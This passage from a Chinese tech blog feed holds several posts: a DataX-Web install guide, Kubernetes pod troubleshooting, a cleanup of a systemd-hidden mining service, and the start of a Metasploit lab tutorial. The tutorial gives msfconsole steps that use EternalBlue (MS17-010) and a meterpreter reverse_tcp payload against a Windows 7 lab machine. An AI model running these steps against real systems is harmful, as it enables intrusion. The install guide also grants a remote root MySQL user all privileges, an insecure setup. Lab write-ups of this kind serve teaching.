class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#下载datax-web界面</span><br>https://pan.baidu.com/s/13yoqhGpD00I82K4lOYtQhg<br>cpsk<br><br><span class="hljs-comment">#安装</span><br>[root@ksbl-sit datax-web-2.1.2]# ./bin/install.sh --force<br><br><span class="hljs-comment">#数据库配置文件</span><br>[root@ksbl-sit datax-web-2.1.2]# <span class="hljs-built_in">cat</span> modules/datax-admin/conf/bootstrap.properties<br><span class="hljs-comment">#Database</span><br>DB_HOST=127.0.0.1<br>DB_PORT=3306<br>DB_USERNAME=root<br>DB_PASSWORD=<br>DB_DATABASE=dataxweb<br><br><span class="hljs-comment">#手动导入数据库</span><br>[root@ksbl-sit ~]# find  ./datax-web-2.1.2 -name <span class="hljs-string">&quot;datax_web.sql&quot;</span><br>./datax-web-2.1.2/bin/db/datax_web.sql<br><br>mysql -u root dataxweb &lt; datax_web.sql<br></code></pre></td></tr></table></figure><p>7、配置datax位置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ksbl-sit bin]# vim /root/datax-web-2.1.2/modules/datax-executor/bin/env.properties<br>........<br><span class="hljs-comment">### 执行datax的python脚本地址</span><br>PYTHON_PATH=datax/bin/datax.py<br>........<br></code></pre></td></tr></table></figure><p>8、启动服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ksbl-sit datax-web-2.1.2]# <span class="hljs-built_in">pwd</span><br>/root/datax-web-2.1.2<br><br>[root@ksbl-sit datax-web-2.1.2]# ./bin/start-all.sh <br>.........<br>2024-12-02 13:43:44.950 [INFO] (3124) DATAX-EXEXUTOR start success<br></code></pre></td></tr></table></figure><p>9、运行jps查看状态，如果出现DataXAdminApplication和DataXExecutorApplication进程，这表示项目运行成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ksbl-sit datax-web-2.1.2]# jps<br>3072 DataXAdminApplication<br>3491 Jps<br>1240 ServerMain<br>3354 DataXExecutorApplication<br><br></code></pre></td></tr></table></figure><p>10、访问</p><p><a href="http://192.1.6.1:9527/index.html">http://192.1.6.1:9527/index.html</a></p><p>账号：admin</p><p>密码：123456</p><p>#如果开了防火墙，需要开放9527端口</p><p>ufw allow 9542</p><h3 id="连接报错处理思路"><a href="#连接报错处理思路" class="headerlink" title="连接报错处理思路"></a>连接报错处理思路</h3><p>如果出现账号密码错误，可查看日志</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ksbl-sit bin]# <span class="hljs-built_in">pwd</span><br>/root/datax-web-2.1.2/modules/datax-admin/bin<br><br>[root@ksbl-sit bin]# <span class="hljs-built_in">tail</span> -f  console.out<br></code></pre></td></tr></table></figure><p>数据库相关错误</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">-- 查看所有用户信息<br><span class="hljs-keyword">select</span> user,host from mysql.user;<br><br>-- 创建用户并设置密码<br>CREATE USER <span class="hljs-string">&#x27;root&#x27;</span>@<span class="hljs-string">&#x27;%&#x27;</span> IDENTIFIED BY <span class="hljs-string">&#x27;chang0123&#x27;</span>;<br><br>-- 授予所有权限<br>GRANT ALL PRIVILEGES ON *.* TO <span class="hljs-string">&#x27;root&#x27;</span>@<span class="hljs-string">&#x27;%&#x27;</span> WITH GRANT OPTION;<br><br>-- 刷新权限<br>FLUSH PRIVILEGES;<br><br>-- 将用户的身份验证插件修改为 mysql_native_password<br>ALTER USER <span class="hljs-string">&#x27;root&#x27;</span>@<span class="hljs-string">&#x27;%&#x27;</span> IDENTIFIED WITH mysql_native_password BY <span class="hljs-string">&#x27;chang0123&#x27;</span>;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux中间件</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pod状态排查思路</title>
    <link href="/2025/04/15/pod%E7%8A%B6%E6%80%81%E6%8E%92%E6%9F%A5%E6%80%9D%E8%B7%AF/"/>
    <url>/2025/04/15/pod%E7%8A%B6%E6%80%81%E6%8E%92%E6%9F%A5%E6%80%9D%E8%B7%AF/</url>
    
    <content type="html"><![CDATA[<ul><li><a href="#terminating">Terminating</a></li><li><a href="#pending">Pending</a></li><li><a href="#containercreating-waiting">ContainerCreating-Waiting</a></li><li><a href="#crashloopbackoff">CrashLoopBackOff</a></li><li><a href="#imagepullbackoff">ImagePullBackOff</a></li></ul><h1 id="Terminating"><a href="#Terminating" class="headerlink" title="Terminating"></a>Terminating</h1><p>有时候删除 Pod 一直卡在 Terminating 状态，一直删不掉，可以从以下方面进行排查。</p><p><strong>分析思路</strong><br>一、首先我们先了解下pod的删除流程：</p><ul><li>APIServer 收到删除 Pod 的请求，Pod 被标记删除，处于 Terminating 状态。</li><li>节点上的 kubelet watch 到了 Pod 被删除，开始销毁 Pod。</li><li>Kubelet 调用运行时接口，清理相关容器。</li><li>所有容器销毁成功，通知 APIServer。</li><li>APIServer 感知到 Pod 成功销毁，检查 metadata 是否还有 finalizers，如果有就等待其它控制器清理完，如果没有就直接从 etcd 中删除 Pod 记录。</li></ul><p>可以看出来，删除 Pod 流程涉及到的组件包含: APIServer, etcd, kubelet 与容器运行时 (如 docker、containerd)。<br>既然都能看到 Pod 卡在 Terminating 状态，说明 APIServer 能正常响应，也能正常从 etcd 中获取数据，一般不会有什么问题，有问题的地方主要就是节点上的操作。</p><p>二、排查思路<br>检查pod节点是否异常</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查找 Terminating 的 Pod 及其所在 Node</span><br>$ kubectl get pod -o wide | grep Terminating<br>grafana-5d7ff8cb89-8gdtz                         1/1     Terminating   1          97d    10.10.7.150   172.20.32.15   &lt;none&gt;           &lt;none&gt;<br><br><span class="hljs-comment"># 检查 Node 是否异常</span><br>$ kubectl get node 172.20.32.15<br>NAME           STATUS      ROLES    AGE    VERSION<br>172.20.32.15   NotReady    &lt;none&gt;   182d   v1.20.6<br><br><span class="hljs-comment"># 查看 Node 相关事件</span><br>$ kubectl describe node 172.20.32.15<br></code></pre></td></tr></table></figure><p><strong>检查内核日志</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">dmesg<br><span class="hljs-comment"># journalctl -k</span><br></code></pre></td></tr></table></figure><p><strong>存在i文件属性</strong><br>如果容器的镜像本身或者容器启动后写入的文件存在 “i” 文件属性，此文件就无法被修改删除，而删除 Pod 时会清理容器目录，但里面包含有不可删除的文件，就一直删不了，Pod 状态也将一直保持 Terminating，kubelet 报错</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Sep 27 14:37:21 VM_0_7_centos kubelet[14109]: E0927 14:37:21.922965   14109 remote_runtime.go:250] RemoveContainer <span class="hljs-string">&quot;19d837c77a3c294052a99ff9347c520bc8acb7b8b9a9dc9fab281fc09df38257&quot;</span> from runtime service failed: rpc error: code = Unknown desc = failed to remove container <span class="hljs-string">&quot;19d837c77a3c294052a99ff9347c520bc8acb7b8b9a9dc9fab281fc09df38257&quot;</span>: Error response from daemon: container 19d837c77a3c294052a99ff9347c520bc8acb7b8b9a9dc9fab281fc09df38257: driver <span class="hljs-string">&quot;overlay2&quot;</span> failed to remove root filesystem: remove /data/docker/overlay2/b1aea29c590aa9abda79f7cf3976422073fb3652757f0391db88534027546868/diff/usr/bin/bash: operation not permitted<br>Sep 27 14:37:21 VM_0_7_centos kubelet[14109]: E0927 14:37:21.923027   14109 kuberuntime_gc.go:126] Failed to remove container <span class="hljs-string">&quot;19d837c77a3c294052a99ff9347c520bc8acb7b8b9a9dc9fab281fc09df38257&quot;</span>: rpc error: code = Unknown desc = failed to remove container <span class="hljs-string">&quot;19d837c77a3c294052a99ff9347c520bc8acb7b8b9a9dc9fab281fc09df38257&quot;</span>: Error response from daemon: container 19d837c77a3c294052a99ff9347c520bc8acb7b8b9a9dc9fab281fc09df38257: driver <span class="hljs-string">&quot;overlay2&quot;</span> failed to remove root filesystem: remove /data/docker/overlay2/b1aea29c590aa9abda79f7cf3976422073fb3652757f0391db88534027546868/diff/usr/bin/bash: operation not permitted<br></code></pre></td></tr></table></figure><p><strong>docker 17 的 bug</strong><br>docker hang 住，没有任何响应，看 event:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Warning FailedSync 3m (x408 over 1h) kubelet, 10.179.80.31 error determining status: rpc error: code = DeadlineExceeded desc = context deadline exceeded<br></code></pre></td></tr></table></figure><p><strong>mount 的目录被其它进程占用</strong><br>dockerd 报错 device or resource busy:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">May 09 09:55:12 VM_0_21_centos dockerd[6540]: <span class="hljs-keyword">time</span>=<span class="hljs-string">&quot;2020-05-09T09:55:12.774467604+08:00&quot;</span> level=error msg=<span class="hljs-string">&quot;Handler for DELETE /v1.38/containers/b62c3796ea2ed5a0bd0eeed0e8f041d12e430a99469dd2ced6f94df911e35905 returned error: container b62c3796ea2ed5a0bd0eeed0e8f041d12e430a99469dd2ced6f94df911e35905: driver \&quot;overlay2\&quot; failed to remove root filesystem: remove /data/docker/overlay2/8bde3ec18c5a6915f40dd8adc3b2f296c1e40cc1b2885db4aee0a627ff89ef59/merged: device or resource busy&quot;</span><br><br>查找还有谁在<span class="hljs-string">&quot;霸占&quot;</span>此目录:<br>$ grep 8bde3ec18c5a6915f40dd8adc3b2f296c1e40cc1b2885db4aee0a627ff89ef59 /proc/*/mountinfo<br>/proc/27187/mountinfo:4500 4415 0:898 / /var/lib/docker/overlay2/8bde3ec18c5a6915f40dd8adc3b2f296c1e40cc1b2885db4aee0a627ff89ef59/merged rw,relatime - overlay overlay rw,lowerdir=/data/docker/overlay2/l/DNQH6VPJHFFANI36UDKS262BZK:/data/docker/overlay2/l/OAYZKUKWNH7GPT4K5MFI6B7OE5:/data/docker/overlay2/l/ANQD5O27DRMTZJG7CBHWUA65YT:/data/docker/overlay2/l/G4HYAKVIRVUXB6YOXRTBYUDVB3:/data/docker/overlay2/l/IRGHNAKBHJUOKGLQBFBQTYFCFU:/data/docker/overlay2/l/6QG67JLGKMFXGVB5VCBG2VYWPI:/data/docker/overlay2/l/O3X5VFRX2AO4USEP2ZOVNLL4ZK:/data/docker/overlay2/l/H5Q5QE6DMWWI75ALCIHARBA5CD:/data/docker/overlay2/l/LFISJNWBKSRTYBVBPU6PH3YAAZ:/data/docker/overlay2/l/JSF6H5MHJEC4VVAYOF5PYIMIBQ:/data/docker/overlay2/l/7D2F45I5MF2EHDOARROYPXCWHZ:/data/docker/overlay2/l/OUJDAGNIZXVBKBWNYCAUI5YSGG:/data/docker/overlay2/l/KZLUO6P3DBNHNUH2SNKPTFZOL7:/data/docker/overlay2/l/O2BPSFNCVXTE4ZIWGYSRPKAGU4,upperdir=/data/docker/overlay2/8bde3ec18c5a6915f40dd8adc3b2f296c1e40cc1b2885db4aee0a627ff89ef59/diff,workdir=/data/docker/overlay2/8bde3ec18c5a6915f40dd8adc3b2f296c1e40cc1b2885db4aee0a627ff89ef59/work<br>/proc/27187/mountinfo:4688 4562 0:898 / /var/lib/docker/overlay2/81c322896bb06149c16786dc33c83108c871bb368691f741a1e3a9bfc0a56ab2/merged/data/docker/overlay2/8bde3ec18c5a6915f40dd8adc3b2f296c1e40cc1b2885db4aee0a627ff89ef59/merged rw,relatime - overlay overlay rw,lowerdir=/data/docker/overlay2/l/DNQH6VPJHFFANI36UDKS262BZK:/data/docker/overlay2/l/OAYZKUKWNH7GPT4K5MFI6B7OE5:/data/docker/overlay2/l/ANQD5O27DRMTZJG7CBHWUA65YT:/data/docker/overlay2/l/G4HYAKVIRVUXB6YOXRTBYUDVB3:/data/docker/overlay2/l/IRGHNAKBHJUOKGLQBFBQTYFCFU:/data/docker/overlay2/l/6QG67JLGKMFXGVB5VCBG2VYWPI:/data/docker/overlay2/l/O3X5VFRX2AO4USEP2ZOVNLL4ZK:/data/docker/overlay2/l/H5Q5QE6DMWWI75ALCIHARBA5CD:/data/docker/overlay2/l/LFISJNWBKSRTYBVBPU6PH3YAAZ:/data/docker/overlay2/l/JSF6H5MHJEC4VVAYOF5PYIMIBQ:/data/docker/overlay2/l/7D2F45I5MF2EHDOARROYPXCWHZ:/data/docker/overlay2/l/OUJDAGNIZXVBKBWNYCAUI5YSGG:/data/docker/overlay2/l/KZLUO6P3DBNHNUH2SNKPTFZOL7:/data/docker/overlay2/l/O2BPSFNCVXTE4ZIWGYSRPKAGU4,upperdir=/data/docker/overlay2/8bde3ec18c5a6915f40dd8adc3b2f296c1e40cc1b2885db4aee0a627ff89ef59/diff,workdir=/data/docker/overlay2/8bde3ec18c5a6915f40dd8adc3b2f296c1e40cc1b2885db4aee0a627ff89ef59/work<br><br>找到进程号后查看此进程更多详细信息:<br>ps -f 27187<br></code></pre></td></tr></table></figure><h1 id="Pending"><a href="#Pending" class="headerlink" title="Pending"></a>Pending</h1><p>Pod 一直 Pending 一般是调度失败，调度失败的原因一般包含以下内容:<br><strong>一、节点没有足够资源分配pod</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kubectl describe node &lt;node-name&gt;<br></code></pre></td></tr></table></figure><p><strong>二、不满足节点亲和</strong><br>如果 Pod 包含 affinity（亲和性）的配置，调度器根据调度算法也可能算出没有满足条件的 Node，从而无法调度。affinity 有以下几类:<br>nodeAffinity: 节点亲和性，可以看成是增强版的 nodeSelector，用于限制 Pod 只允许被调度到某一部分 Node。<br>podAffinity:   Pod亲和性，用于将一些有关联的 Pod 调度到同一个地方，同一个地方可以是指同一个节点或同一个可用区的节点等。<br>podAntiAffinity: Pod 反亲和性，用于避免将某一类 Pod 调度到同一个地方避免单点故障，比如将集群 DNS 服务的 Pod 副本都调度到不同节点，避免一个节点挂了造成整个集群 DNS 解析失败，使得业务中断</p><p><strong>三、污点</strong><br>节点如果被打上了污点，Pod 必须要容忍污点才能调度上去:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">0/5 nodes are available: 3 node(s) had taints that the pod didn<span class="hljs-string">&#x27;t tolerate, 2 Insufficient memory.</span><br></code></pre></td></tr></table></figure><p>通过 describe node 可以看下 Node 有哪些 Taints:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ kubectl describe nodes host1<br>...<br>Taints:             special=<span class="hljs-literal">true</span>:NoSchedule<br>...<br></code></pre></td></tr></table></figure><p>如果希望 Pod 可以调度上去，通常解决方法有两个:<br>1.删除污点</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kubectl taint nodes host1 special-<br></code></pre></td></tr></table></figure><p>2.给pod加上污点容忍</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">tolerations:<br>- key: <span class="hljs-string">&quot;special&quot;</span><br>  operator: <span class="hljs-string">&quot;Equal&quot;</span><br>  value: <span class="hljs-string">&quot;true&quot;</span><br>  effect: <span class="hljs-string">&quot;NoSchedule&quot;</span><br></code></pre></td></tr></table></figure><p><strong>四、kube-scheduler没有正常运行</strong><br>检查 maser 上的 kube-scheduler 是否运行正常，异常的话可以尝试重启临时恢复。</p><h1 id="ContainerCreating-Waiting"><a href="#ContainerCreating-Waiting" class="headerlink" title="ContainerCreating-Waiting"></a>ContainerCreating-Waiting</h1><p><strong>一、镜像问题</strong></p><p><strong>二、configmap&#x2F;secret挂载问题</strong></p><p><strong>三、limit 设置太小或者单位不对</strong></p><p><strong>四、存在同名容器</strong></p><h1 id="CrashLoopBackOff"><a href="#CrashLoopBackOff" class="headerlink" title="CrashLoopBackOff"></a>CrashLoopBackOff</h1><p>Pod 如果处于 CrashLoopBackOff 状态说明之前是启动了，只是又异常退出了。</p><p><strong>一、容器进程主动退出</strong><br>如果是容器进程主动退出，退出状态码一般在 0-128 之间，除了可能是业务程序 BUG，还有其它许多可能原因。内部程序崩溃或者依赖缺失等。</p><p><strong>二、系统 OOM</strong><br>如果是系统oom溢出，容器状态码是137，表示被 SIGKILL 信号杀死，同时内核会报错: Out of memory: Kill process。大概率是节点上部署了其它非 K8S 管理的进程消耗了比较多的内存</p><p><strong>三、cgroup OOM</strong><br>如果是 cgrou OOM 杀掉的进程，从 Pod 事件的下 Reason 可以看到是 OOMKilled，说明容器实际占用的内存超过 limit 了，同时内核日志会报: Memory cgroup out of memory。 可以根据需求调整下 limit。</p><p><strong>四、探针问题，健康检查失败</strong><br>Liveness 和 Readiness 探针配置不正确，导致容器不断重启。</p><h1 id="ImagePullBackOff"><a href="#ImagePullBackOff" class="headerlink" title="ImagePullBackOff"></a>ImagePullBackOff</h1><p><strong>一、私有镜像仓库认证失败</strong><br>仓库需要认证，配置的 Secret 不存在或者有误都会认证失败，可以先在调度的Node节点中执行docker pull命令，验证镜像是否可以拉取</p><p><strong>二、镜像文件损坏</strong><br>如果 push 的镜像文件损坏了，下载下来也用不了，需要重新 push 镜像文件</p>]]></content>
    
    
    <categories>
      
      <category>kubernetes</category>
      
    </categories>
    
    
    <tags>
      
      <tag>故障案例</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于服务器挖矿处理思路</title>
    <link href="/2025/04/15/%E5%85%B3%E4%BA%8E%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%8C%96%E7%9F%BF%E5%A4%84%E7%90%86%E6%80%9D%E8%B7%AF/"/>
    <url>/2025/04/15/%E5%85%B3%E4%BA%8E%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%8C%96%E7%9F%BF%E5%A4%84%E7%90%86%E6%80%9D%E8%B7%AF/</url>
    
    <content type="html"><![CDATA[<h3 id="事件背景"><a href="#事件背景" class="headerlink" title="事件背景"></a>事件背景</h3><p>起因是有开发人员报障，程序在发布后无法正常运行，一直处于在重启的状态。</p><p>一开始我以为是程序本身的问题，但在查看服务日志后，并未发现程序有任何错误。</p><p>在查看监控系统时，发现该服务器节点CPU 利用率达到了100%，难怪程序已经无法运行。并且，还发现有这种情况的节点不止一个，整个环境中有好几台服务器都是CPU 100%的情况</p><p><img src="https://i-blog.csdnimg.cn/img_convert/54b89b99fe603651bad5853bf18f8247.png"></p><h3 id="一、查看进程"><a href="#一、查看进程" class="headerlink" title="一、查看进程"></a>一、查看进程</h3><p>使用Top命令查看进程 ，可以看到CPU的使用率已经跑满。但在进程列表中却未发现有异常进程 。除有个别业务程序占用CPU较多，但关掉后情况并未改善。</p><p><img src="https://i-blog.csdnimg.cn/img_convert/e00d13399b5798d88997449ce2f10757.png"></p><h3 id="二、查看网络访问"><a href="#二、查看网络访问" class="headerlink" title="二、查看网络访问"></a>二、查看网络访问</h3><p>此时，怀疑是机器被入侵了，因此通过下面命令查看网络连接的情况。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">netstat -an |grep ESTABLISHED<br></code></pre></td></tr></table></figure><p>在查看几台机器后，发现有问题的机器都有一个外网连接，如下所示。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">tcp        0      0 10.12.15.7:39410        86.107.101.103:7643     ESTABLISHED<br><br>虽然每台机器连接的外网IP地址不同，但端口号统一都是 7643，并且查询地址后发现都是国外地址。<br>由于相关的服务器并没有国外的业务，因此可以确定被病毒入侵无疑了。<br></code></pre></td></tr></table></figure><h3 id="三、查看启动项"><a href="#三、查看启动项" class="headerlink" title="三、查看启动项"></a>三、查看启动项</h3><p>使用下面命令查看开机启动项</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">systemctl list-unit-files |grep enabled<br></code></pre></td></tr></table></figure><p>在启动项中，发现有一个名为OOlmeN2R.service 的可疑服务，怀疑就是病毒。（注：该病毒在不同机器的服务名称皆不同，随机的。但特点是乱码，有大小写或数字。）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">auditd.service                                enabled<br>autovt@.service                               enabled<br>crond.service                                 enabled<br>docker.service                                enabled<br>OOlmeN2R.service                              enabled   &lt;-------<br>rhel-autorelabel.service                      enabled<br>rhel-configure.service                        enabled<br>rhel-dmesg.service                            enabled<br>rhel-domainname.service                       enabled<br>rhel-import-state.service                     enabled<br>rhel-loadmodules.service                      enabled<br>rhel-readonly.service                         enabled<br>rsyslog.service                               enabled<br>sshd.service                                  enabled<br></code></pre></td></tr></table></figure><p>通过下面命令，查看服务的启动状态以及启动文件的存放位置。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">systemctl status OOlmeN2R.service<br></code></pre></td></tr></table></figure><p>接着，找到该启动文件，并查看文件内容。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">cat</span> /usr/lib/systemd/system/OOlmeN2R.service<br>[Unit]<br>Description=service<br>After=network.target<br><br>[Service]<br>Type=simple<br>ExecStart=/bin/eWqAVtbn<br>RemainAfterExit=<span class="hljs-built_in">yes</span><br>Restart=always<br>RestartSec=60s<br></code></pre></td></tr></table></figure><p>可以看到，服务在启动时调用了一个&#x2F;bin&#x2F;eWqAVtbn 文件，这应该是就病毒的执行文件了。</p><h3 id="四、清除病毒"><a href="#四、清除病毒" class="headerlink" title="四、清除病毒"></a>四、清除病毒</h3><p>在发现病毒文件后，现在我们可以开始来清除病毒了。</p><p>停止病毒服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">systemctl stop OOlmeN2R.service<br>systemctl <span class="hljs-built_in">disable</span> OOlmeN2R.service<br></code></pre></td></tr></table></figure><p>删除相关病毒文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">rm</span> /bin/eWqAVtbn   <span class="hljs-comment">#删除执行文件</span><br><span class="hljs-built_in">rm</span> /usr/lib/systemd/system/OOlmeN2R.service  <span class="hljs-comment"># 删除启动文件</span><br></code></pre></td></tr></table></figure><p>删除完成后，重启服务器。</p><p>完成上述步骤后，再次查看该网络链接，发现该链接已消失。同时，服务器CPU使用率恢复到正常状态 ，病毒被清除了。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>该病毒有可能是挖矿类的病毒，占用机器资源进行任务，因此导致CPU使用率暴涨。同时，病毒较为狡猾，具有以下特点：</p><p>1.隐藏自己的进程，无法通过TOP命令来发现。<br>2.加入开机启动项，保证重启服务器后依然会生效。<br>3.文件名随机，在不同机器上都不一样，增大了排查难度。</p><p>目前，通过本文档记录的方法，可以有效清除病毒。已知经过处理后的机器未再出现重复中毒情况。</p>]]></content>
    
    
    <categories>
      
      <category>故障处理案例</category>
      
    </categories>
    
    
    <tags>
      
      <tag>故障案例</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>msf渗透测试之永恒之蓝</title>
    <link href="/2025/04/12/msf%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/"/>
    <url>/2025/04/12/msf%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/</url>
    
    <content type="html"><![CDATA[<h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><p><strong>前提：对方的445端口必须开放,首先要保证是能够访问到目标机器的，那么我们先ping一下目标机器，看网络是否连通</strong></p><p><strong>如果无法ping的话，对方机器必须要关闭防火墙，或许有其他方法在对方开启防火墙的情况下访问到对方？目前采用关闭防火墙</strong></p><p><strong>使用工具：kali</strong></p><p>靶机：windows 7  ip：10.0.0.128</p><p>攻击机器：kali IP：10.0.0.139</p><p>Metasploit就是一个漏洞框架。它的全称叫做The Metasploit Framework，简称MSF。是一个免费、可下载的框架，通过它可以很容易地获取、开发并对计算机软件漏洞实施攻击。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#登录MSF</span><br>┌──(root㉿kali)-[/home/cherry]<br>└─# msfconsole  <br>       =[ metasploit v6.4.54-dev                          ]  框架的版本号是 v6.4.54-dev<br>+ -- --=[ 2499 exploits - 1289 auxiliary - 393 post       ]  2499 个漏洞利用模块。1289个辅助模块。393个后渗透模块<br>+ -- --=[ 1607 payloads - 49 encoders - 13 nops           ]  1607 个有效载荷  49个编码器 13个NOP 生成器<br>+ -- --=[ 9 evasion    9 个规避模<br></code></pre></td></tr></table></figure><h1 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h1><h2 id="1-基础使用"><a href="#1-基础使用" class="headerlink" title="1.基础使用"></a>1.基础使用</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apl">msfconsole    #进入框架<br>search  ms17_010                                    # 使用search命令查找相关漏洞<br>use exploit/windows/smb/ms17_010_eternalblue        # 使用use进入模块<br>info         #使用info查看模块信息<br>set payload windows/x64/meterpreter/reverse_tcp    #设置攻击载荷<br>show options    #查看模块需要配置的参数<br>set  RHOST 10.0.0.128            #设置参数<br>exploit / run         #攻击<br>后渗透阶段 #后渗透阶段<br></code></pre></td></tr></table></figure><p>不同的攻击用到的步骤也不一样，这不是一成不变的，需要灵活使用。 我们也可以将攻击代码写入configure.rc（只要是以.rc结尾的文件）配置文件中，然后使用命令msfconsole -r configure.rc进行自动攻击！</p><h2 id="2-MS17-010-永恒之蓝-："><a href="#2-MS17-010-永恒之蓝-：" class="headerlink" title="2.MS17_010(永恒之蓝)："></a>2.MS17_010(永恒之蓝)：</h2><p>我们现在模拟使用 MS17_010 漏洞攻击，这个漏洞就是去年危害全球的勒索病毒利用的永恒之蓝漏洞</p><h2 id="3-Meterpreter"><a href="#3-Meterpreter" class="headerlink" title="3.Meterpreter"></a>3.Meterpreter</h2><p>Meterpreter属于stage payload，在Metasploit 